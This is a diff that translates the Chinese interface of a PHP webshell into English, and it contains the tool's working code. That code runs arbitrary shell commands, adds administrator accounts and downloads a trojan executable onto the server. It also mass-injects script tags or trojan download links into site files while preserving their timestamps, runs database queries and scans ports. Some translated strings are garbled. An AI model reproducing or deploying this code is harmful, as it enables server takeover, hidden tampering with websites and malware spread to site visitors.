-<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>将清马应用于该文件夹,子文件夹和文件
-<br><input type="radio" name="qb" value="b">仅将清马应用于该文件夹</div>
-<div class="actall"><input type="button" value="开始清马" style="width:80px;height:26px;" onclick="autoup();"></div>
+<div class="actall">Clear code <textarea name="qc" id="qc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js"&gt;&lt;/script&gt;</textarea></div>
+<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>Keep the file modification time unchanged</div>
+<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>Apply Qingma to this folder,Subfolders and files
+<br><input type="radio" name="qb" value="b">Only apply Qingma to this folder</div>
+<div class="actall"><input type="button" value="Start cleaning" style="width:80px;height:26px;" onclick="autoup();"></div>
 </form>
 END;
 	return true;
@@ -727,7 +730,7 @@ function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb)
 				for($i = 0;$i < count($nc[1]);$i++){if(eregi($tca,$nc[1][$i])){$ic = str_replace($nc[1][$i],$tcb,$ic);$doing = true;}}
 			}
 			if($td) $ftime = @filemtime($Filepath);
-			if($doing) echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">成功:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">失败:</font>'.$Filepath.' <br>'."\r\n";
+			if($doing) echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">success:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">failure:</font>'.$Filepath.' <br>'."\r\n";
 			if($td) @touch($Filepath,$ftime);
 			ob_flush();
 			flush();
@@ -747,7 +750,7 @@ function Tihuan_d()
 		$tb = ($_POST['tb'] == 'a') ? true : false;
 		$th = ($_POST['th'] == 'a') ? true : false;
 		if($th) $_POST['tca'] = str_replace('.','\\.',$_POST['tca']);
-		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">替换完毕</a>' : '<a href="#" onclick="window.location=\'?s=d\'">异常终止</a>';
+		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">Replaced</a>' : '<a href="#" onclick="window.location=\'?s=d\'">Abnormal termination</a>';
 		echo '</div>';
 		return false;
 	}
@@ -763,37 +766,37 @@ function Fulllll(i){
   return true;
 }
 function showth(th){
-	if(th == 'a') document.getElementById('setauto').innerHTML = '查找内容 <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>替换成为 <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
-	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>下载后缀 <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>替换成为 <input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
+	if(th == 'a') document.getElementById('setauto').innerHTML = 'Find content <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Replace with <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
+	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>Download suffix <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>Replace with <input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
 	return true;
 }
 function autoup(){
-	if(document.getElementById('tp').value == ''){alert('替换路径不能为空');return false;}
-	if(document.getElementById('tt').value == ''){alert('文件类型不能为空');return false;}
-	if(document.getElementById('tca').value == ''){alert('替换代码不能为空');return false;}
+	if(document.getElementById('tp').value == ''){alert('The replacement path cannot be empty');return false;}
+	if(document.getElementById('tt').value == ''){alert('File type cannot be empty');return false;}
+	if(document.getElementById('tca').value == ''){alert('Replacement code cannot be empty');return false;}
 	document.getElementById('tform').submit();
 }
 </script>
 <form method="POST" name="tform" id="tform" action="?s=d">
-<div class="actall" style="height:35px;">替换路径 <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
+<div class="actall" style="height:35px;">Replacement path <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
 <select onchange='return Fulllll(options[selectedIndex].value)'>
-<option value="0" selected>--范围选择--</option>
-<option value="1">网站跟目录</option>
-<option value="2">本程序目录</option>
+<option value="0" selected>--Range selection--</option>
+<option value="1">Website and directory</option>
+<option value="2">This program directory</option>
 </select></div>
-<div class="actall" style="height:35px;">文件类型 <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
+<div class="actall" style="height:35px;">file type <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
 <select onchange='return Fulllll(options[selectedIndex].value)'>
-<option value="0" selected>--类型选择--</option>
-<option value="3">静态文件</option>
-<option value="4">脚本+静态</option>
-<option value="5">JS文件</option>
+<option value="0" selected>--Type selection--</option>
+<option value="3">Static file</option>
+<option value="4">script+Static</option>
+<option value="5">JS file</option>
 </select></div>
-<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>替换文件中的指定内容 <input type="radio" name="th" value="b" onclick="showth('b')">替换文件中的下载地址<br>
-<div id="setauto">查找内容 <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>替换成为 <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
-<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>保持文件修改时间不变</div>
-<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>将替换应用于该文件夹,子文件夹和文件
-<br><input type="radio" name="tb" value="b">仅将替换应用于该文件夹</div>
-<div class="actall"><input type="button" value="开始替换" style="width:80px;height:26px;" onclick="autoup();"></div>
+<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>Replace the specified content in the file <input type="radio" name="th" value="b" onclick="showth('b')">Replace the download address in the file<br>
+<div id="setauto">Find content <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Replace with <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
+<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>Keep the file modification time unchanged</div>
+<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>Apply replacement to this folder,Subfolders and files
+<br><input type="radio" name="tb" value="b">Only apply replacement to this folder</div>
+<div class="actall"><input type="button" value="Start replacing" style="width:80px;height:26px;" onclick="autoup();"></div>
 </form>
 END;
 	return true;
@@ -820,7 +823,7 @@ function Antivirus_Auto($sp,$features,$st,$sb)
 				{
 					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);
 					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
-					echo ' <a href="'.$Fileurls.'" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br> 【<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank"> 编辑 </a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank"> 删除 </a> 】 ';
+					echo ' <a href="'.$Fileurls.'" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br> 【<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank"> edit </a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank"> delete </a> 】 ';
 					echo ' 【 '.$Filetime.' 】 <font color="#FF0000"> '.$var.' </font> <br> <br> '."\r\n";
 					break;
 				}
@@ -835,19 +838,19 @@ function Antivirus_Auto($sp,$features,$st,$sb)
 
 function Antivirus_e()
 {
-	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
+	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'successfully deleted';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'successfully deleted' : 'failed to delete';} return false;}
 	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
 	$SCAN_DIR = isset($_POST['sp']) ? $_POST['sp'] : File_Mode();
-	$features_php = array('php大马特征1'=>'cha88.cn','php大马特征2'=>'->read()','php大马特征3'=>'readdir(','危险MYSQL语句4'=>'returns string soname','php加密大马特征5'=>'eval(gzinflate(','php加密大马特征6'=>'eval(base64_decode(','php一句话特征7'=>'eval($_','php一句话特征8'=>'eval ($_','php上传后门特征9'=>'copy($_FILES','php上传后门特征10'=>'copy ($_FILES','php上传后门特征11'=>'move_uploaded_file($_FILES','php上传后门特征12'=>'move_uploaded_file ($_FILES','php小马特征13'=>'str_replace(\'\\\\\',\'/\',');
-	$features_asx = array('asp小马特征1'=>'绝对路径','asp小马特征2'=>'输入马的内容','asp小马特征3'=>'fso.createtextfile(path,true)','asp一句话特征4'=>'<%execute(request','asp一句话特征5'=>'<%eval request','asp一句话特征6'=>'execute session(','asp数据库后门特征7'=>'--Created!','asp大马特征8'=>'WScript.Shell','asp大小马特征9'=>'<%@ LANGUAGE = VBScript.Encode %>','aspx大马特征10'=>'www.rootkit.net.cn','aspx大马特征11'=>'Process.GetProcesses','aspx大马特征12'=>'lake2');
+	$features_php = array('php Malaysia features 1'=>'cha88.cn','php Malaysia features 2'=>'->read()','php Malaysia features 3'=>'readdir(','Dangerous MYSQL statement 4'=>'returns string soname','php encryption Malaysia features 5'=>'eval(gzinflate(','PHP encryption Malaysia features 6'=>'eval(base64_decode(','Php one sentence feature 7'=>'eval($_','Php one sentence feature 8'=>'eval ($_','PHP upload backdoor features 9'=>'copy($_FILES','PHP upload backdoor featuresTen'=>'copy ($_FILES','PHP upload backdoor features 11'=>'move_uploaded_file($_FILES','PHP upload backdoor features 12'=>'move_uploaded_file ($_FILES','php pony features 13'=>'str_replace(\'\\\\\',\'/\',');
+	$features_asx = array('asp pony features 1'=>'Absolute path','asp pony features 2'=>'Enter the content of the horse','asp pony features 3'=>'fso.createtextfile(path,true)','Asp one sentence feature 4'=>'<%execute(request','Asp one sentence feature 5'=>'<%eval request','Asp one sentence feature 6'=>'execute session(','Asp database backdoor features 7'=>'--Created!','asp Malaysia features 8'=>'WScript.Shell','asp big horse features 9'=>'<%@ LANGUAGE = VBScript.Encode %>','aspx Malaysia features 10'=>'www.rootkit.net.cn','aspx Malaysia Features 11'=>'Process.GetProcesses','aspx Malaysia features 12'=>'lake2');
 print<<<END
 <form method="POST" name="tform" id="tform" action="?s=e">
-<div class="actall">扫描路径 <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:600px;"></div>
-<div class="actall">木马类型 <input type="checkbox" name="stphp" value="php" checked>php木马 
-<input type="checkbox" name="stasx" value="asx">asp+aspx木马</div>
-<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>将扫马应用于该文件夹,子文件夹和文件
-<br><input type="radio" name="sb" value="b">仅将扫马应用于该文件夹</div>
-<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
+<div class="actall">Scan path <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:600px;"></div>
+<div class="actall">Trojan type <input type="checkbox" name="stphp" value="php" checked>php Trojan 
+<input type="checkbox" name="stasx" value="asx">asp+aspx Trojan</div>
+<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>Apply sweeping horse to this folder,Subfolders and files
+<br><input type="radio" name="sb" value="b">Only apply sweeping to this folder</div>
+<div class="actall"><input type="submit" value="Start scanning" style="width:80px;"></div>
 </form>
 END;
 	if(!empty($_POST['sp']))
@@ -857,7 +860,7 @@ END;
 		if(isset($_POST['stasx'])){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
 		if(isset($_POST['stphp']) && isset($_POST['stasx'])){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
 		$sb = ($_POST['sb'] == 'a') ? true : false;
-		echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? '扫描完毕' : '异常终止';
+		echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? 'Scan completed' : 'Abnormal termination';
 		echo '</div>';
 	}
 	return true;
@@ -901,21 +904,21 @@ function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb)
 
 function Findfile_j()
 {
-	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
+	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo 'successfully deleted';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? 'successfully deleted' : 'failed to delete';} return false;}
 	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
 	$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode();
 	$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';
 	$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';
 print<<<END
 <form method="POST" name="jform" id="jform" action="?s=j">
-<div class="actall">扫描路径 <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
-<div class="actall">过滤文件 <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
-<div class="actall">关键字串 <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
-<input type="radio" name="sff" value="a" checked>搜索文件名 
-<input type="radio" name="sff" value="b">搜索包含文字</div>
-<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>将搜索应用于该文件夹,子文件夹和文件
-<br><input type="radio" name="sfb" value="b">仅将搜索应用于该文件夹</div>
-<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
+<div class="actall">Scan path <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
+<div class="actall">Filter files <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
+<div class="actall">Keyword string <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
+<input type="radio" name="sff" value="a" checked>Search file name 
+<input type="radio" name="sff" value="b">Search contains text</div>
+<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>Apply search to this folder,Subfolders and files
+<br><input type="radio" name="sfb" value="b">Only apply search to this folder</div>
+<div class="actall"><input type="submit" value="Start scanning" style="width:80px;"></div>
 </form>
 END;
 	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))
@@ -924,7 +927,7 @@ END;
 		$_POST['sft'] = str_replace('.','\\.',$_POST['sft']);
 		$sff = ($_POST['sff'] == 'a') ? true : false;
 		$sfb = ($_POST['sfb'] == 'a') ? true : false;
-		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '搜索完毕' : '异常终止';
+		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? 'Search completed' : 'Abnormal termination';
 		echo '</div>';
 	}
 	return true;
@@ -937,52 +940,52 @@ function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes"
 function Info_f()
 {
 	$dis_func = get_cfg_var("disable_functions");
-	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
+	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "Upload not allowed";
 	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
 	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
 	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
 	$info = array(
-		array("服务器时间",date("Y年m月d日 h:i:s",time())),
-		array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
-		array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
-		array("服务器操作系统",PHP_OS),
-		array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
-		array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
-		array("你的IP",getenv('REMOTE_ADDR')),
-		array("Web服务端口",$_SERVER['SERVER_PORT']),
-		array("PHP运行方式",strtoupper(php_sapi_name())),
-		array("PHP版本",PHP_VERSION),
-		array("运行于安全模式",Info_Cfg("safemode")),
-		array("服务器管理员",$adminmail),
-		array("本文件路径",__FILE__),
-		array("允许使用 URL 打开文件 allow_url_fopen",Info_Cfg("allow_url_fopen")),
-		array("允许动态加载链接库 enable_dl",Info_Cfg("enable_dl")),
-		array("显示错误信息 display_errors",Info_Cfg("display_errors")),
-		array("自动定义全局变量 register_globals",Info_Cfg("register_globals")),
+		array("server time",date("Y年m月d日 h:i:s",time())),
+		array("Server domain name","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
+		array("Server IP address",gethostbyname($_SERVER['SERVER_NAME'])),
+		array("Server operating system",PHP_OS),
+		array("Server operating system text encoding",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
+		array("Server interpretation engine",$_SERVER['SERVER_SOFTWARE']),
+		array("Your IP",getenv('REMOTE_ADDR')),
+		array("Web service port",$_SERVER['SERVER_PORT']),
+		array("How PHP works",strtoupper(php_sapi_name())),
+		array("PHP version",PHP_VERSION),
+		array("Run in safe mode",Info_Cfg("safemode")),
+		array("Server administrator",$adminmail),
+		array("Path to this file",__FILE__),
+		array("with permission URL open a file allow_url_fopen",Info_Cfg("allow_url_fopen")),
+		array("Allow dynamic loading of link libraries enable_dl",Info_Cfg("enable_dl")),
+		array("Show error message display_errors",Info_Cfg("display_errors")),
+		array("Automatically define global variables register_globals",Info_Cfg("register_globals")),
 		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
-		array("程序最多允许使用内存量 memory_limit",Info_Cfg("memory_limit")),
-		array("POST最大字节数 post_max_size",Info_Cfg("post_max_size")),
-		array("允许最大上传文件 upload_max_filesize",$upsize),
-		array("程序最长运行时间 max_execution_time",Info_Cfg("max_execution_time")."秒"),
-		array("被禁用的函数 disable_functions",$dis_func),
+		array("The maximum amount of memory allowed by the program memory_limit",Info_Cfg("memory_limit")),
+		array("Maximum POST bytes post_max_size",Info_Cfg("post_max_size")),
+		array("Maximum allowed file upload upload_max_filesize",$upsize),
+		array("Maximum program running time max_execution_time",Info_Cfg("max_execution_time")."秒"),
+		array("Disabled functions disable_functions",$dis_func),
 		array("phpinfo()",$phpinfo),
-		array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
-		array("图形处理 GD Library",Info_Fun("imageline")),
-		array("IMAP电子邮件系统",Info_Fun("imap_close")),
-		array("MySQL数据库",Info_Fun("mysql_close")),
-		array("SyBase数据库",Info_Fun("sybase_close")),
-		array("Oracle数据库",Info_Fun("ora_close")),
-		array("Oracle 8 数据库",Info_Fun("OCILogOff")),
-		array("PREL相容语法 PCRE",Info_Fun("preg_match")),
-		array("PDF文档支持",Info_Fun("pdf_close")),
-		array("Postgre SQL数据库",Info_Fun("pg_close")),
-		array("SNMP网络管理协议",Info_Fun("snmpget")),
-		array("压缩文件支持(Zlib)",Info_Fun("gzclose")),
-		array("XML解析",Info_Fun("xml_set_object")),
+		array("There is still free space diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
+		array("Graphics processing GD Library",Info_Fun("imageline")),
+		array("IMAP email system",Info_Fun("imap_close")),
+		array("MySQL database",Info_Fun("mysql_close")),
+		array("SyBase database",Info_Fun("sybase_close")),
+		array("Oracle database",Info_Fun("ora_close")),
+		array("Oracle 8 database",Info_Fun("OCILogOff")),
+		array("PREL compatible syntax PCRE",Info_Fun("preg_match")),
+		array("PDF document support",Info_Fun("pdf_close")),
+		array("Postgre SQL database",Info_Fun("pg_close")),
+		array("SNMP network management protocol",Info_Fun("snmpget")),
+		array("Compressed file support(Zlib)",Info_Fun("gzclose")),
+		array("XML parsing",Info_Fun("xml_set_object")),
 		array("FTP",Info_Fun("ftp_login")),
-		array("ODBC数据库连接",Info_Fun("odbc_close")),
-		array("Session支持",Info_Fun("session_start")),
-		array("Socket支持",Info_Fun("fsockopen")),
+		array("ODBC database connection",Info_Fun("odbc_close")),
+		array("Session support",Info_Fun("session_start")),
+		array("Socket support",Info_Fun("fsockopen")),
 	);
 	echo '<table width="100%" border="0">';
 	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
@@ -1006,7 +1009,7 @@ function Exec_Run($cmd)
 
 function Exec_g()
 {
-	$res = '回显窗口';
+	$res = 'Echo window';
 	$cmd = 'dir';
 	if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}
 print<<<END
@@ -1025,17 +1028,17 @@ function sFull(i){
 }
 </script>
 <form method="POST" name="gform" id="gform" action="?s=g"><center><div class="actall">
-命令参数 <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
+Command parameters <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
 <select onchange='return sFull(options[selectedIndex].value)'>
-<option value="0" selected>--命令集合--</option>
-<option value="1">添加管理员</option>
-<option value="2">设为管理组</option>
-<option value="3">查看端口</option>
-<option value="4">查看地址</option>
-<option value="5">复制文件</option>
-<option value="6">FTP下载</option>
+<option value="0" selected>--Command collection--</option>
+<option value="1">Add manager</option>
+<option value="2">Set as management group</option>
+<option value="3">View port</option>
+<option value="4">View address</option>
+<option value="5">Copy files</option>
+<option value="6">FTP download</option>
 </select>
-<input type="submit" value="执行" style="width:80px;"></div>
+<input type="submit" value="submit" style="width:80px;"></div>
 <div class="actall"><textarea name="show" style="width:660px;height:399px;">{$res}</textarea></div></center>
 </form>
 END;
@@ -1059,16 +1062,16 @@ if($object == 'downloader')
 	$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';
 	$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(__FILE__).'/muma.exe');
 print<<<END
-<div class="actall">超连接 <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
-<div class="actall">下载到 <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
+<div class="actall">Hyperlink <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
+<div class="actall">Download to <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
 <div class="actall"><input value="下载" type="submit" style="width:80px;"></div></form>
 END;
 	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
 	{
 		echo '<div class="actall">';
 		$contents = @file_get_contents($_POST['durl']);
-		if(!$contents) echo '无法读取要下载的数据';
-		else echo File_Write($_POST['dpath'],$contents,'wb') ? '下载文件成功' : '下载文件失败';
+		if(!$contents) echo 'Unable to read the data to be downloaded';
+		else echo File_Write($_POST['dpath'],$contents,'wb') ? 'File downloaded successfully' : 'Failed to download file';
 		echo '</div>';
 	}
 }
@@ -1076,8 +1079,8 @@ elseif($object == 'wscript')
 {
 	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir';
 print<<<END
-<div class="actall">执行CMD命令 <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
-<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>
+<div class="actall">Execute CMD command <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
+<div class="actall"><input type="submit" value="carried out" style="width:80px;"></div></form>
 END;
 	if(!empty($_POST['cmd']))
 	{
@@ -1097,15 +1100,15 @@ elseif($object == 'application')
 	$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';
 	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\windows\php.ini c:\php.ini';
 print<<<END
-<div class="actall">程序路径 <input type="text" name="run" value="{$run}" style="width:600px;"></div>
-<div class="actall">命令参数 <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
+<div class="actall">Program path <input type="text" name="run" value="{$run}" style="width:600px;"></div>
+<div class="actall">Command parameters <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
 <div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>
 END;
 	if(!empty($_POST['run']))
 	{
 		echo '<div class="actall">';
 		$shell = new COM('application');
-		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '执行成功' : '执行失败';
+		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'execution succeed' : 'Execution failed';
 		@$shell->Release();
 		$shell = NULL;
 		echo '</div>';
@@ -1123,7 +1126,7 @@ function hFull(i){
 	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
 	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
 	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
-	Str[4] = "Provider=MSDAORA.1;Password=密码;User ID=帐号;Data Source=服务名;Persist Security Info=True;";
+	Str[4] = "Provider=MSDAORA.1;Password=password;User ID=account number;Data Source=Service Name;Persist Security Info=True;";
 	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
 	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES('spider','mypass')";
 	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
@@ -1136,25 +1139,25 @@ function hFull(i){
 	return true;
 }
 </script>
-<div class="actall">连接字符串 <input type="text" name="string" id="string" value="{$string}" style="width:526px;">
+<div class="actall">Connection string <input type="text" name="string" id="string" value="{$string}" style="width:526px;">
 <select onchange="return hFull(options[selectedIndex].value)">
-<option value="0" selected>--连接示例--</option>
-<option value="1">Access连接</option>
-<option value="2">MsSql连接</option>
-<option value="3">MySql连接</option>
-<option value="4">Oracle连接</option>
-<option value="5">--SQL语法--</option>
-<option value="6">显示数据</option>
-<option value="7">添加数据</option>
-<option value="8">删除数据</option>
-<option value="9">修改数据</option>
-<option value="10">建数据表</option>
-<option value="11">删数据表</option>
-<option value="12">添加字段</option>
-<option value="13">删除字段</option>
+<option value="0" selected>--Connection example--</option>
+<option value="1">Access connection</option>
+<option value="2">MsSql connection</option>
+<option value="3">MySql connection</option>
+<option value="4">Oracle connection</option>
+<option value="5">--SQL syntax--</option>
+<option value="6">Display Data</option>
+<option value="7">adding data</option>
+<option value="8">delete data</option>
+<option value="9">change the data</option>
+<option value="10">Build a data table</option>
+<option value="11">Delete data table</option>
+<option value="12">Add field</option>
+<option value="13">Delete field</option>
 </select></div>
-<div class="actall">SQL命令 <input type="text" name="sql" id="sql" value="{$sql}" style="width:650px;"></div>
-<div class="actall"><input type="submit" value="执行" style="width:80px;"></div>
+<div class="actall">SQL commands <input type="text" name="sql" id="sql" value="{$sql}" style="width:650px;"></div>
+<div class="actall"><input type="submit" value="carried out" style="width:80px;"></div>
 </form>
 END;
 	if(!empty($string))
@@ -1165,7 +1168,7 @@ END;
 		$result = @$shell->Execute($sql);
 		$count = $result->Fields->Count();
 		for($i = 0;$i < $count;$i++){$Field[$i] = $result->Fields($i);}
-		echo $result ? $sql.' 执行成功<br>' : $sql.' 执行失败<br>';
+		echo $result ? $sql.' execution succeed<br>' : $sql.' Execution failed<br>';
 		if(!empty($count)){while(!$result->EOF){for($i = 0;$i < $count;$i++){echo htmlspecialchars($Field[$i]->value).'<br>';}@$result->MoveNext();}}
 		$shell->Close();
 		@$shell->Release();
@@ -1184,9 +1187,9 @@ function Port_i()
 	$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|23|25|80|110|135|139|445|1433|3306|3389|43958';
 print<<<END
 <form method="POST" name="iform" id="iform" action="?s=i">
-<div class="actall">扫描IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
-<div class="actall">端口号 <input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
-<div class="actall"><input type="submit" value="扫描" style="width:80px;"></div>
+<div class="actall">Scan IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
+<div class="actall">The port number <input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
+<div class="actall"><input type="submit" value="scanning" style="width:80px;"></div>
 </form>
 END;
 	if((!empty($_POST['ip'])) && (!empty($_POST['port'])))
@@ -1196,7 +1199,7 @@ END;
 		for($i = 0;$i < count($ports);$i++)
 		{
 			$fp = @fsockopen($_POST['ip'],$ports[$i],$errno,$errstr,2);
-			echo $fp ? '<font color="#FF0000">开放端口 ---> '.$ports[$i].'</font><br>' : '关闭端口 ---> '.$ports[$i].'<br>';
+			echo $fp ? '<font color="#FF0000">Open port ---> '.$ports[$i].'</font><br>' : 'Close port ---> '.$ports[$i].'<br>';
 			ob_flush();
 			flush();
 		}
@@ -1213,13 +1216,13 @@ function Linux_k()
